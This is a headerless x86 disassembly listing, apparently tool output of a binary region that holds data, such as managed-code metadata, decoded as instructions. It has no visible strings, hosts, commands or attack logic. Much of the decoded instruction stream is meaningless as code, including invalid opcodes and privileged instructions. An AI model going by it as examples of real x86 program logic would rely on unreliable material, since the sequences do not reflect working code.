  40643f:	00 01                	add    %al,(%ecx)
  406441:	00 df                	add    %bl,%bh
  406443:	09 00                	or     %eax,(%eax)
  406445:	00 01                	add    %al,(%ecx)
  406447:	00 c9                	add    %cl,%cl
  406449:	05 00 00 02 00       	add    $0x20000,%eax
  40644e:	cf                   	iret
  40644f:	05 00 00 03 00       	add    $0x30000,%eax
  406454:	d6                   	salc
  406455:	05 00 00 01 00       	add    $0x10000,%eax
  40645a:	7d 09                	jge    0x406465
  40645c:	00 00                	add    %al,(%eax)
  40645e:	02 00                	add    (%eax),%al
  406460:	8a 09                	mov    (%ecx),%cl
  406462:	00 00                	add    %al,(%eax)
  406464:	01 00                	add    %eax,(%eax)
  406466:	b1 09                	mov    $0x9,%cl
  406468:	00 00                	add    %al,(%eax)
  40646a:	02 00                	add    (%eax),%al
  40646c:	c2 09 00             	ret    $0x9
  40646f:	00 01                	add    %al,(%ecx)
  406471:	00 df                	add    %bl,%bh
  406473:	09 09                	or     %ecx,(%ecx)
  406475:	00 36                	add    %dh,(%esi)
  406477:	01 13                	add    %edx,(%ebx)
  406479:	00 a1 00 36 01 45    	add    %ah,0x45013600(%ecx)
  40647f:	02 b1 00 36 01 54    	add    0x54013600(%ecx),%dh
  406485:	02 11                	add    (%ecx),%dl
  406487:	00 36                	add    %dh,(%esi)
  406489:	01 13                	add    %edx,(%ebx)
  40648b:	00 b9 00 36 01 13    	add    %bh,0x13013600(%ecx)
  406491:	00 24 00             	add    %ah,(%eax,%eax,1)
  406494:	36 01 13             	add    %edx,%ss:(%ebx)
  406497:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40649a:	36 01 13             	add    %edx,%ss:(%ebx)
  40649d:	00 34 00             	add    %dh,(%eax,%eax,1)
  4064a0:	36 01 13             	add    %edx,%ss:(%ebx)
  4064a3:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4064a6:	36 01 13             	add    %edx,%ss:(%ebx)
  4064a9:	00 24 00             	add    %ah,(%eax,%eax,1)
  4064ac:	88 02                	mov    %al,(%edx)
  4064ae:	8b 00                	mov    (%eax),%eax
  4064b0:	2c 00                	sub    $0x0,%al
  4064b2:	88 02                	mov    %al,(%edx)
  4064b4:	8b 00                	mov    (%eax),%eax
  4064b6:	34 00                	xor    $0x0,%al
  4064b8:	88 02                	mov    %al,(%edx)
  4064ba:	8b 00                	mov    (%eax),%eax
  4064bc:	3c 00                	cmp    $0x0,%al
  4064be:	88 02                	mov    %al,(%edx)
  4064c0:	8b 00                	mov    (%eax),%eax
  4064c2:	c1 00 36             	roll   $0x36,(%eax)
  4064c5:	01 13                	add    %edx,(%ebx)
  4064c7:	00 c9                	add    %cl,%cl
  4064c9:	00 36                	add    %dh,(%esi)
  4064cb:	01 13                	add    %edx,(%ebx)
  4064cd:	00 d1                	add    %dl,%cl
  4064cf:	00 36                	add    %dh,(%esi)
  4064d1:	01 a3 02 d9 00 aa    	add    %esp,-0x55ff26fe(%ebx)
  4064d7:	0b ee                	or     %esi,%ebp
  4064d9:	02 19                	add    (%ecx),%bl
  4064db:	00 2b                	add    %ch,(%ebx)
  4064dd:	02 63 00             	add    0x0(%ebx),%ah
  4064e0:	19 00                	sbb    %eax,(%eax)
  4064e2:	34 02                	xor    $0x2,%al
  4064e4:	68 00 29 00 cb       	push   $0xcb002900
  4064e9:	0b fb                	or     %ebx,%edi
  4064eb:	02 19                	add    (%ecx),%bl
  4064ed:	00 4d 02             	add    %cl,0x2(%ebp)
  4064f0:	71 00                	jno    0x4064f2
  4064f2:	e9 00 e7 0b 0b       	jmp    0xb4c4bf7
  4064f7:	03 19                	add    (%ecx),%ebx
  4064f9:	00 36                	add    %dh,(%esi)
  4064fb:	01 13                	add    %edx,(%ebx)
  4064fd:	00 f1                	add    %dh,%cl
  4064ff:	00 36                	add    %dh,(%esi)
  406501:	01 1b                	add    %ebx,(%ebx)
  406503:	03 44 00 98          	add    -0x68(%eax,%eax,1),%eax
  406507:	02 90 00 f9 00 36    	add    0x3600f900(%eax),%dl
  40650d:	01 96 03 01 01 36    	add    %edx,0x36010103(%esi)
  406513:	01 13                	add    %edx,(%ebx)
  406515:	00 09                	add    %cl,(%ecx)
  406517:	01 36                	add    %esi,(%esi)
  406519:	01 13                	add    %edx,(%ebx)
  40651b:	00 11                	add    %dl,(%ecx)
  40651d:	01 81 0c 9f 00 19    	add    %eax,0x19009f0c(%ecx)
  406523:	01 90 0c a1 03 21    	add    %edx,0x2103a10c(%eax)
  406529:	01 36                	add    %esi,(%esi)
  40652b:	01 a3 02 29 01 36    	add    %esp,0x36012902(%ebx)
  406531:	01 13                	add    %edx,(%ebx)
  406533:	00 59 00             	add    %bl,0x0(%ecx)
  406536:	d3 02                	roll   %cl,(%edx)
  406538:	e7 03                	out    %eax,$0x3
  40653a:	39 01                	cmp    %eax,(%ecx)
  40653c:	4d                   	dec    %ebp
  40653d:	02 ec                	add    %ah,%ch
  40653f:	03 41 01             	add    0x1(%ecx),%eax
  406542:	2a 0d f1 03 49 01    	sub    0x14903f1,%cl
  406548:	46                   	inc    %esi
  406549:	0d e7 03 41 01       	or     $0x14103e7,%eax
  40654e:	4b                   	dec    %ebx
  40654f:	0d 17 00 19 01       	or     $0x1190017,%eax
  406554:	62 0d f8 03 59 01    	bound  %ecx,0x15903f8
  40655a:	36 01 11             	add    %edx,%ss:(%ecx)
  40655d:	02 59 00             	add    0x0(%ecx),%bl
  406560:	36 01 ff             	ss add %edi,%edi
  406563:	03 59 00             	add    0x0(%ecx),%ebx
  406566:	74 0d                	je     0x406575
  406568:	13 00                	adc    (%eax),%eax
  40656a:	59                   	pop    %ecx
  40656b:	00 7a 0d             	add    %bh,0xd(%edx)
  40656e:	13 00                	adc    (%eax),%eax
  406570:	69 01 a8 0d 13 04    	imul   $0x4130da8,(%ecx),%eax
  406576:	69 01 d3 0d 18 04    	imul   $0x4180dd3,(%ecx),%eax
  40657c:	69 01 e8 0d e7 03    	imul   $0x3e70de8,(%ecx),%eax
  406582:	61                   	popa
  406583:	01 36                	add    %esi,(%esi)
  406585:	01 13                	add    %edx,(%ebx)
  406587:	00 61 01             	add    %ah,0x1(%ecx)
  40658a:	03 0e                	add    (%esi),%ecx
  40658c:	1f                   	pop    %ds
  40658d:	04 79                	add    $0x79,%al
  40658f:	01 1e                	add    %ebx,(%esi)
  406591:	0e                   	push   %cs
  406592:	13 00                	adc    (%eax),%eax
  406594:	69 00 36 01 13 00    	imul   $0x130136,(%eax),%eax
  40659a:	69 00 26 0e 31 04    	imul   $0x4310e26,(%eax),%eax
  4065a0:	81 01 36 0e 37 04    	addl   $0x4370e36,(%ecx)
  4065a6:	89 01                	mov    %eax,(%ecx)
  4065a8:	36 01 13             	add    %edx,%ss:(%ebx)
  4065ab:	00 49 00             	add    %cl,0x0(%ecx)
  4065ae:	36 01 96 03 31 00 36 	add    %edx,%ss:0x36003103(%esi)
  4065b5:	01 3b                	add    %edi,(%ebx)
  4065b7:	04 39                	add    $0x39,%al
  4065b9:	00 36                	add    %dh,(%esi)
  4065bb:	01 13                	add    %edx,(%ebx)
  4065bd:	00 31                	add    %dh,(%ecx)
  4065bf:	00 a5 0e 48 04 31    	add    %ah,0x3104480e(%ebp)
  4065c5:	00 bb 0e 48 04 39    	add    %bh,0x3904480e(%ebx)
  4065cb:	01 ce                	add    %ecx,%esi
  4065cd:	0e                   	push   %cs
  4065ce:	4d                   	dec    %ebp
  4065cf:	04 31                	add    $0x31,%al
  4065d1:	00 d8                	add    %bl,%al
  4065d3:	0e                   	push   %cs
  4065d4:	52                   	push   %edx
  4065d5:	04 89                	add    $0x89,%al
  4065d7:	00 36                	add    %dh,(%esi)
  4065d9:	01 11                	add    %edx,(%ecx)
  4065db:	02 31                	add    (%ecx),%dh
  4065dd:	00 0d 04 58 04 91    	add    %cl,0x91045804
  4065e3:	01 36                	add    %esi,(%esi)
  4065e5:	01 11                	add    %edx,(%ecx)
  4065e7:	02 41 00             	add    0x0(%ecx),%al
  4065ea:	36 01 67 04          	add    %esp,%ss:0x4(%edi)
  4065ee:	c1 01 fc             	roll   $0xfc,(%ecx)
  4065f1:	0e                   	push   %cs
  4065f2:	37                   	aaa
  4065f3:	04 c9                	add    $0xc9,%al
  4065f5:	01 36                	add    %esi,(%esi)
  4065f7:	01 13                	add    %edx,(%ebx)
  4065f9:	00 49 01             	add    %cl,0x1(%ecx)
  4065fc:	0d 0f ca 00 c9       	or     $0xc900ca0f,%eax
  406601:	01 1a                	add    %ebx,(%edx)
  406603:	0f 71                	(bad)
  406605:	00 19                	add    %bl,(%ecx)
  406607:	01 29                	add    %ebp,(%ecx)
  406609:	0f 7b                	(bad)
  40660b:	04 49                	add    $0x49,%al
  40660d:	01 41 0f             	add    %eax,0xf(%ecx)
  406610:	81 04 d1 01 4f 0f 71 	addl   $0x710f4f01,(%ecx,%edx,8)
  406617:	00 49 01             	add    %cl,0x1(%ecx)
  40661a:	5f                   	pop    %edi
  40661b:	0f 0c                	(bad)
  40661d:	01 d9                	add    %ebx,%ecx
  40661f:	01 4d 02             	add    %ecx,0x2(%ebp)
  406622:	71 00                	jno    0x406624
  406624:	19 01                	sbb    %eax,(%ecx)
  406626:	90                   	nop
  406627:	0c 87                	or     $0x87,%al
  406629:	04 e1                	add    $0xe1,%al
  40662b:	01 36                	add    %esi,(%esi)
  40662d:	01 a3 02 f1 01 a3    	add    %esp,-0x5cfe0efe(%ebx)
  406633:	0f 97 04 e9          	seta   (%ecx,%ebp,8)
  406637:	01 4d 02             	add    %ecx,0x2(%ebp)
  40663a:	1f                   	pop    %ds
  40663b:	04 f9                	add    $0xf9,%al
  40663d:	01 ba 0f 9f 00 01    	add    %edi,0x1009f0f(%edx)
  406643:	02 d0                	add    %al,%dl
  406645:	0f aa                	rsm
  406647:	04 09                	add    $0x9,%al
  406649:	02 08                	add    (%eax),%cl
  40664b:	10 b8 04 11 02 36    	adc    %bh,0x36021104(%eax)
  406651:	01 be 04 11 02 37    	add    %edi,0x37021104(%esi)
  406657:	10 c5                	adc    %al,%ch
  406659:	04 49                	add    $0x49,%al
  40665b:	01 b6 10 ca 00 19    	add    %esi,0x1900ca10(%esi)
  406661:	01 90 0c d4 04 21    	add    %edx,0x2104d40c(%eax)
  406667:	02 36                	add    (%esi),%dh
  406669:	01 54 02 61          	add    %edx,0x61(%edx,%eax,1)
  40666d:	00 36                	add    %dh,(%esi)
  40666f:	01 13                	add    %edx,(%ebx)
  406671:	00 21                	add    %ah,(%ecx)
  406673:	02 c6                	add    %dh,%al
  406675:	10 db                	adc    %bl,%bl
  406677:	04 31                	add    $0x31,%al
  406679:	02 ca                	add    %dl,%cl
  40667b:	10 e1                	adc    %ah,%cl
  40667d:	04 39                	add    $0x39,%al
  40667f:	02 d8                	add    %al,%bl
  406681:	10 e7                	adc    %ah,%bh
  406683:	04 29                	add    $0x29,%al
  406685:	02 e4                	add    %ah,%ah
  406687:	10 ed                	adc    %ch,%ch
  406689:	04 61                	add    $0x61,%al
  40668b:	00 ed                	add    %ch,%ch
  40668d:	10 f2                	adc    %dh,%dl
  40668f:	04 39                	add    $0x39,%al
  406691:	02 f4                	add    %ah,%dh
  406693:	10 37                	adc    %dh,(%edi)
  406695:	04 61                	add    $0x61,%al
  406697:	00 4d 02             	add    %cl,0x2(%ebp)
  40669a:	71 00                	jno    0x40669c
  40669c:	19 01                	sbb    %eax,(%ecx)
  40669e:	fd                   	std
  40669f:	10 68 00             	adc    %ch,0x0(%eax)
  4066a2:	61                   	popa
  4066a3:	00 fd                	add    %bh,%ch
  4066a5:	10 68 00             	adc    %ch,0x0(%eax)
  4066a8:	19 01                	sbb    %eax,(%ecx)
  4066aa:	08 11                	or     %dl,(%ecx)
  4066ac:	f8                   	clc
  4066ad:	04 19                	add    $0x19,%al
  4066af:	01 2f                	add    %ebp,(%edi)
  4066b1:	11 99 00 41 02 36    	adc    %ebx,0x36024100(%ecx)
  4066b7:	01 a3 02 21 02 36    	add    %esp,0x36022102(%ebx)
  4066bd:	01 10                	add    %edx,(%eax)
  4066bf:	05 01 02 35 11       	add    $0x11350201,%eax
  4066c4:	17                   	pop    %ss
  4066c5:	05 49 02 36 01       	add    $0x1360249,%eax
  4066ca:	a3 02 49 02 c6       	mov    %eax,0xc6024902
  4066cf:	10 13                	adc    %dl,(%ebx)
  4066d1:	00 51 02             	add    %dl,0x2(%ecx)
  4066d4:	56                   	push   %esi
  4066d5:	11 38                	adc    %edi,(%eax)
  4066d7:	05 c9 01 5f 11       	add    $0x115f01c9,%eax
  4066dc:	3e 05 61 02 89 11    	ds add $0x11890261,%eax
  4066e2:	42                   	inc    %edx
  4066e3:	05 69 02 92 11       	add    $0x11920269,%eax
  4066e8:	47                   	inc    %edi
  4066e9:	05 71 02 4d 02       	add    $0x24d0271,%eax
  4066ee:	71 00                	jno    0x4066f0
  4066f0:	19 01                	sbb    %eax,(%ecx)
  4066f2:	9f                   	lahf
  4066f3:	11 f8                	adc    %edi,%eax
  4066f5:	04 31                	add    $0x31,%al
  4066f7:	00 a6 11 56 05 39    	add    %ah,0x39055611(%esi)
  4066fd:	00 b1 11 5c 05 39    	add    %dh,0x39055c11(%ecx)
  406703:	01 b9 11 61 05 79    	add    %edi,0x79056111(%ecx)
  406709:	02 1e                	add    (%esi),%bl
  40670b:	0e                   	push   %cs
  40670c:	13 00                	adc    (%eax),%eax
  40670e:	39 00                	cmp    %eax,(%eax)
  406710:	c7                   	(bad)
  406711:	11 66 05             	adc    %esp,0x5(%esi)
  406714:	39 00                	cmp    %eax,(%eax)
  406716:	d1 11                	rcll   $1,(%ecx)
  406718:	6b 05 39 00 fd 10 73 	imul   $0x73,0x10fd0039,%eax
  40671f:	05 81 02 36 01       	add    $0x1360281,%eax
  406724:	11 02                	adc    %eax,(%edx)
  406726:	59                   	pop    %ecx
  406727:	00 36                	add    %dh,(%esi)
  406729:	01 77 05             	add    %esi,0x5(%edi)
  40672c:	89 02                	mov    %eax,(%edx)
  40672e:	ff 11                	call   *(%ecx)
  406730:	7e 05                	jle    0x406737
  406732:	91                   	xchg   %eax,%ecx
  406733:	02 1a                	add    (%edx),%bl
  406735:	12 df                	adc    %bh,%bl
  406737:	00 99 02 3e 12 a0    	add    %bl,-0x5fedc1fe(%ecx)
  40673d:	05 39 01 4d 02       	add    $0x24d0139,%eax
  406742:	cc                   	int3
  406743:	01 31                	add    %esi,(%ecx)
  406745:	00 4f 12             	add    %cl,0x12(%edi)
  406748:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406749:	05 31 00 54 12       	add    $0x12540031,%eax
  40674e:	58                   	pop    %eax
  40674f:	04 99                	add    $0x99,%al
  406751:	02 46 0d             	add    0xd(%esi),%al
  406754:	df 00                	filds  (%eax)
  406756:	31 00                	xor    %eax,(%eax)
  406758:	32 04 56             	xor    (%esi,%edx,2),%al
  40675b:	05 41 00 1e 0e       	add    $0xe1e0041,%eax
  406760:	13 00                	adc    (%eax),%eax
  406762:	79 02                	jns    0x406766
  406764:	5e                   	pop    %esi
  406765:	12 13                	adc    (%ebx),%dl
  406767:	00 31                	add    %dh,(%ecx)
  406769:	00 5e 12             	add    %bl,0x12(%esi)
  40676c:	13 00                	adc    (%eax),%eax
  40676e:	31 00                	xor    %eax,(%eax)
  406770:	1e                   	push   %ds
  406771:	0e                   	push   %cs
  406772:	13 00                	adc    (%eax),%eax
  406774:	a9 02 67 12 17       	test   $0x17126702,%eax
  406779:	00 19                	add    %bl,(%ecx)
  40677b:	01 90 0c cc 05 d1    	add    %edx,-0x2efa33f4(%eax)
  406781:	02 62 0d             	add    0xd(%edx),%ah
  406784:	dd 05 e1 02 17 13    	fldl   0x131702e1
  40678a:	17                   	pop    %ss
  40678b:	00 31                	add    %dh,(%ecx)
  40678d:	00 2e                	add    %ch,(%esi)
  40678f:	13 e8                	adc    %eax,%ebp
  406791:	05 f1 02 3f 13       	add    $0x133f02f1,%eax
  406796:	f3 01 f9             	repz add %edi,%ecx
  406799:	01 50 13             	add    %edx,0x13(%eax)
  40679c:	ca 00 f9             	lret   $0xf900
  40679f:	01 5c 13 a1          	add    %ebx,-0x5f(%ebx,%edx,1)
  4067a3:	03 61 01             	add    0x1(%ecx),%esp
  4067a6:	64 13 54 02 f9       	adc    %fs:-0x7(%edx,%eax,1),%edx
  4067ab:	02 74 0d ef          	add    -0x11(%ebp,%ecx,1),%dh
  4067af:	05 11 01 85 13       	add    $0x13850111,%eax
  4067b4:	f6 05 59 00 8b 13 13 	testb  $0x13,0x138b0059
  4067bb:	00 59 00             	add    %bl,0x0(%ecx)
  4067be:	74 0d                	je     0x4067cd
  4067c0:	00 06                	add    %al,(%esi)
  4067c2:	49                   	dec    %ecx
  4067c3:	01 9f 13 05 06 11    	add    %ebx,0x11060513(%edi)
  4067c9:	03 b2 13 9f 00 11    	add    0x11009f13(%edx),%esi
  4067cf:	03 be 13 0c 06 31    	add    0x31060c13(%esi),%edi
  4067d5:	01 cb                	add    %ecx,%ebx
  4067d7:	13 71 00             	adc    0x0(%ecx),%esi
  4067da:	51                   	push   %ecx
  4067db:	02 06                	add    (%esi),%al
  4067dd:	14 12                	adc    $0x12,%al
  4067df:	06                   	push   %es
  4067e0:	19 03                	sbb    %eax,(%ebx)
  4067e2:	2f                   	das
  4067e3:	14 18                	adc    $0x18,%al
  4067e5:	06                   	push   %es
  4067e6:	21 03                	and    %eax,(%ebx)
  4067e8:	3f                   	aas
  4067e9:	14 a3                	adc    $0xa3,%al
  4067eb:	02 29                	add    (%ecx),%ch
  4067ed:	03 53 14             	add    0x14(%ebx),%edx
  4067f0:	1e                   	push   %ds
  4067f1:	06                   	push   %es
  4067f2:	29 03                	sub    %eax,(%ebx)
  4067f4:	65 14 24             	gs adc $0x24,%al
  4067f7:	06                   	push   %es
  4067f8:	c1 02 70             	roll   $0x70,(%edx)
  4067fb:	14 68                	adc    $0x68,%al
  4067fd:	00 c1                	add    %al,%cl
  4067ff:	02 7a 14             	add    0x14(%edx),%bh
  406802:	68 00 c9 02 36       	push   $0x3602c900
  406807:	01 2a                	add    %ebp,(%edx)
  406809:	06                   	push   %es
  40680a:	b1 02                	mov    $0x2,%cl
  40680c:	ae                   	scas   %es:(%edi),%al
  40680d:	14 33                	adc    $0x33,%al
  40680f:	06                   	push   %es
  406810:	39 03                	cmp    %eax,(%ebx)
  406812:	70 14                	jo     0x406828
  406814:	68 00 39 03 7a       	push   $0x7a033900
  406819:	14 68                	adc    $0x68,%al
  40681b:	00 b9 02 36 01 3c    	add    %bh,0x3c013602(%ecx)
  406821:	06                   	push   %es
  406822:	b1 02                	mov    $0x2,%cl
  406824:	cb                   	lret
  406825:	14 42                	adc    $0x42,%al
  406827:	06                   	push   %es
  406828:	c9                   	leave
  406829:	02 36                	add    (%esi),%dh
  40682b:	01 3c 06             	add    %edi,(%esi,%eax,1)
  40682e:	c1 02 36             	roll   $0x36,(%edx)
  406831:	01 50 06             	add    %edx,0x6(%eax)
  406834:	b1 02                	mov    $0x2,%cl
  406836:	e7 14                	out    %eax,$0x14
  406838:	58                   	pop    %eax
  406839:	06                   	push   %es
  40683a:	51                   	push   %ecx
  40683b:	03 fd                	add    %ebp,%edi
  40683d:	14 68                	adc    $0x68,%al
  40683f:	06                   	push   %es
  406840:	39 03                	cmp    %eax,(%ebx)
  406842:	06                   	push   %es
  406843:	15 6e 06 f1 02       	adc    $0x2f1066e,%eax
  406848:	0b 15 f9 01 b1 02    	or     0x2b101f9,%edx
  40684e:	1e                   	push   %ds
  40684f:	0e                   	push   %cs
  406850:	13 00                	adc    (%eax),%eax
  406852:	39 03                	cmp    %eax,(%ebx)
  406854:	1e                   	push   %ds
  406855:	0e                   	push   %cs
  406856:	13 00                	adc    (%eax),%eax
  406858:	61                   	popa
  406859:	03 41 15             	add    0x15(%ecx),%eax
  40685c:	bc 06 61 03 5c       	mov    $0x5c036106,%esp
  406861:	15 c2 06 69 03       	adc    $0x36906c2,%eax
  406866:	61                   	popa
  406867:	15 ca 06 71 03       	adc    $0x37106ca,%eax
  40686c:	75 15                	jne    0x406883
  40686e:	71 00                	jno    0x406870
  406870:	29 00                	sub    %eax,(%eax)
  406872:	7e 15                	jle    0x406889
  406874:	d0 06                	rolb   $1,(%esi)
  406876:	89 02                	mov    %eax,(%edx)
  406878:	89 15 d7 06 01 02    	mov    %edx,0x20106d7
  40687e:	91                   	xchg   %eax,%ecx
  40687f:	15 e8 06 f1 02       	adc    $0x2f106e8,%eax
  406884:	af                   	scas   %es:(%edi),%eax
  406885:	15 4d 04 19 01       	adc    $0x119044d,%eax
  40688a:	bd 15 ef 06 11       	mov    $0x1106ef15,%ebp
  40688f:	03 c8                	add    %eax,%ecx
  406891:	15 8e 01 f1 02       	adc    $0x2f1018e,%eax
  406896:	cf                   	iret
  406897:	15 8e 01 71 00       	adc    $0x71018e,%eax
  40689c:	e3 15                	jecxz  0x4068b3
  40689e:	0b 07                	or     (%edi),%eax
  4068a0:	81 03 36 01 13 00    	addl   $0x130136,(%ebx)
  4068a6:	81 03 74 0d 13 00    	addl   $0x130d74,(%ebx)
  4068ac:	81 03 ef 15 11 07    	addl   $0x71115ef,(%ebx)
  4068b2:	71 00                	jno    0x4068b4
  4068b4:	fb                   	sti
  4068b5:	15 16 07 54 00       	adc    $0x540716,%eax
  4068ba:	36 01 13             	add    %edx,%ss:(%ebx)
  4068bd:	00 54 00 2c          	add    %dl,0x2c(%eax,%eax,1)
  4068c1:	16                   	push   %ss
  4068c2:	3a 07                	cmp    (%edi),%al
  4068c4:	f9                   	stc
  4068c5:	02 30                	add    (%eax),%dh
  4068c7:	16                   	push   %ss
  4068c8:	40                   	inc    %eax
  4068c9:	07                   	pop    %es
  4068ca:	f9                   	stc
  4068cb:	02 3d 16 71 00 19    	add    0x19007116,%bh
  4068d1:	01 51 16             	add    %edx,0x16(%ecx)
  4068d4:	8e 01                	mov    (%ecx),%es
  4068d6:	19 01                	sbb    %eax,(%ecx)
  4068d8:	5f                   	pop    %edi
  4068d9:	16                   	push   %ss
  4068da:	71 00                	jno    0x4068dc
  4068dc:	19 01                	sbb    %eax,(%ecx)
  4068de:	67 16                	addr16 push %ss
  4068e0:	ef                   	out    %eax,(%dx)
  4068e1:	06                   	push   %es
  4068e2:	5c                   	pop    %esp
  4068e3:	00 36                	add    %dh,(%esi)
  4068e5:	01 11                	add    %edx,(%ecx)
  4068e7:	02 99 03 a8 16 4f    	add    0x4f16a803(%ecx),%bl
  4068ed:	07                   	pop    %es
  4068ee:	b9 03 d6 16 7d       	mov    $0x7d16d603,%ecx
  4068f3:	07                   	pop    %es
  4068f4:	69 00 26 0e 84 07    	imul   $0x7840e26,(%eax),%eax
  4068fa:	a9 03 dd 16 a3       	test   $0xa316dd03,%eax
  4068ff:	02 a9 03 eb 16 96    	add    -0x69e914fd(%ecx),%ch
  406905:	03 a9 03 01 17 48    	add    0x48170103(%ecx),%ebp
  40690b:	04 a9                	add    $0xa9,%al
  40690d:	03 0d 17 a3 02 a9    	add    0xa902a317,%ecx
  406913:	03 24 17             	add    (%edi,%edx,1),%esp
  406916:	89 07                	mov    %eax,(%edi)
  406918:	d1 02                	roll   $1,(%edx)
  40691a:	30 17                	xor    %dl,(%edi)
  40691c:	cc                   	int3
  40691d:	01 11                	add    %edx,(%ecx)
  40691f:	03 47 17             	add    0x17(%edi),%eax
  406922:	10 01                	adc    %al,(%ecx)
  406924:	19 01                	sbb    %eax,(%ecx)
  406926:	55                   	push   %ebp
  406927:	17                   	pop    %ss
  406928:	ef                   	out    %eax,(%dx)
  406929:	06                   	push   %es
  40692a:	c9                   	leave
  40692b:	03 36                	add    (%esi),%esi
  40692d:	01 a3 02 c9 03 71    	add    %esp,0x7103c902(%ebx)
  406933:	17                   	pop    %ss
  406934:	a2 07 c9 03 81       	mov    %al,0x8103c907
  406939:	17                   	pop    %ss
  40693a:	a3 02 f9 02 74       	mov    %eax,0x7402f902
  40693f:	0d a9 07 69 03       	or     $0x36907a9,%eax
  406944:	8f                   	(bad)
  406945:	17                   	pop    %ss
  406946:	c2 07 69             	ret    $0x6907
  406949:	03 e7                	add    %edi,%esp
  40694b:	0b ed                	or     %ebp,%ebp
  40694d:	04 d9                	add    $0xd9,%al
  40694f:	03 b7 17 c8 07 d9    	add    -0x26f837e9(%edi),%esi
  406955:	03 f3                	add    %ebx,%esi
  406957:	09 cf                	or     %ecx,%edi
  406959:	07                   	pop    %es
  40695a:	e9 03 ce 17 e6       	jmp    0xe6583762
  40695f:	07                   	pop    %es
  406960:	e9 03 d7 17 ec       	jmp    0xec584068
  406965:	07                   	pop    %es
  406966:	31 00                	xor    %eax,(%eax)
  406968:	29 04 f2             	sub    %eax,(%edx,%esi,8)
  40696b:	07                   	pop    %es
  40696c:	f1                   	int1
  40696d:	03 36                	add    (%esi),%esi
  40696f:	01 a3 02 f9 03 36    	add    %esp,0x3603f902(%ebx)
  406975:	01 0a                	add    %ecx,(%edx)
  406977:	08 f9                	or     %bh,%cl
  406979:	01 2e                	add    %ebp,(%esi)
  40697b:	18 ca                	sbb    %cl,%dl
  40697d:	00 09                	add    %cl,(%ecx)
  40697f:	04 36                	add    $0x36,%al
  406981:	01 a3 02 11 04 49    	add    %esp,0x49041102(%ebx)
  406987:	18 a3 02 e1 02 53    	sbb    %ah,0x5302e102(%ebx)
  40698d:	18 ca                	sbb    %cl,%dl
  40698f:	00 e1                	add    %ah,%cl
  406991:	02 63 18             	add    0x18(%ebx),%ah
  406994:	ca 00 c9             	lret   $0xc900
  406997:	03 36                	add    (%esi),%esi
  406999:	01 13                	add    %edx,(%ebx)
  40699b:	00 c9                	add    %cl,%cl
  40699d:	03 76 18             	add    0x18(%esi),%esi
  4069a0:	a3 02 c9 03 83       	mov    %eax,0x8303c902
  4069a5:	18 96 03 c9 03 96    	sbb    %dl,-0x69fc36fd(%esi)
  4069ab:	18 96 03 c9 03 a6    	sbb    %dl,-0x59fc36fd(%esi)
  4069b1:	18 96 03 19 04 c1    	sbb    %dl,-0x3efbe6fd(%esi)
  4069b7:	18 fe                	sbb    %bh,%dh
  4069b9:	00 e1                	add    %ah,%cl
  4069bb:	02 c6                	add    %dh,%al
  4069bd:	18 17                	sbb    %dl,(%edi)
  4069bf:	00 f9                	add    %bh,%cl
  4069c1:	02 ca                	add    %dl,%cl
  4069c3:	18 23                	sbb    %ah,(%ebx)
  4069c5:	08 f9                	or     %bh,%cl
  4069c7:	02 dc                	add    %ah,%bl
  4069c9:	18 71 00             	sbb    %dh,0x0(%ecx)
  4069cc:	19 04 ec             	sbb    %eax,(%esp,%ebp,8)
  4069cf:	18 30                	sbb    %dh,(%eax)
  4069d1:	08 19                	or     %bl,(%ecx)
  4069d3:	04 f8                	add    $0xf8,%al
  4069d5:	18 35 08 21 04 0c    	sbb    %dh,0xc042108
  4069db:	19 3b                	sbb    %edi,(%ebx)
  4069dd:	08 39                	or     %bh,(%ecx)
  4069df:	01 16                	add    %edx,(%esi)
  4069e1:	19 40 08             	sbb    %eax,0x8(%eax)
  4069e4:	39 01                	cmp    %eax,(%ecx)
  4069e6:	cf                   	iret
  4069e7:	15 45 08 39 01       	adc    $0x1390845,%eax
  4069ec:	ce                   	into
  4069ed:	0e                   	push   %cs
  4069ee:	4a                   	dec    %edx
  4069ef:	08 99 00 4d 02 71    	or     %bl,0x71024d00(%ecx)
  4069f5:	00 09                	add    %cl,(%ecx)
  4069f7:	04 36                	add    $0x36,%al
  4069f9:	01 4f 08             	add    %ecx,0x8(%edi)
  4069fc:	19 00                	sbb    %eax,(%eax)
  4069fe:	2b 02                	sub    (%edx),%eax
  406a00:	55                   	push   %ebp
  406a01:	08 11                	or     %dl,(%ecx)
  406a03:	04 d1                	add    $0xd1,%al
  406a05:	11 00                	adc    %eax,(%eax)
  406a07:	06                   	push   %es
  406a08:	49                   	dec    %ecx
  406a09:	01 26                	add    %esp,(%esi)
  406a0b:	19 ca                	sbb    %ecx,%edx
  406a0d:	00 f9                	add    %bh,%cl
  406a0f:	02 39                	add    (%ecx),%bh
  406a11:	19 71 08             	sbb    %esi,0x8(%ecx)
  406a14:	19 01                	sbb    %eax,(%ecx)
  406a16:	48                   	dec    %eax
  406a17:	19 8e 01 39 04 36    	sbb    %ecx,0x36043901(%esi)
  406a1d:	01 13                	add    %edx,(%ebx)
  406a1f:	00 41 04             	add    %al,0x4(%ecx)
  406a22:	36 01 13             	add    %edx,%ss:(%ebx)
  406a25:	00 51 04             	add    %dl,0x4(%ecx)
  406a28:	36 01 13             	add    %edx,%ss:(%ebx)
  406a2b:	00 59 04             	add    %bl,0x4(%ecx)
  406a2e:	e5 19                	in     $0x19,%eax
  406a30:	85 08                	test   %ecx,(%eax)
  406a32:	61                   	popa
  406a33:	04 f7                	add    $0xf7,%al
  406a35:	19 8c 08 69 04 0f 1a 	sbb    %ecx,0x1a0f0469(%eax,%ecx,1)
  406a3c:	99                   	cltd
  406a3d:	08 69 04             	or     %ch,0x4(%ecx)
  406a40:	22 1a                	and    (%edx),%bl
  406a42:	9f                   	lahf
  406a43:	08 69 04             	or     %ch,0x4(%ecx)
  406a46:	2b 1a                	sub    (%edx),%ebx
  406a48:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406a49:	08 49 04             	or     %cl,0x4(%ecx)
  406a4c:	3b 1a                	cmp    (%edx),%ebx
  406a4e:	ac                   	lods   %ds:(%esi),%al
  406a4f:	08 f9                	or     %bh,%cl
  406a51:	02 5d 1a             	add    0x1a(%ebp),%bl
  406a54:	c9                   	leave
  406a55:	08 79 04             	or     %bh,0x4(%ecx)
  406a58:	6c                   	insb   (%dx),%es:(%edi)
  406a59:	1a 71 00             	sbb    0x0(%ecx),%dh
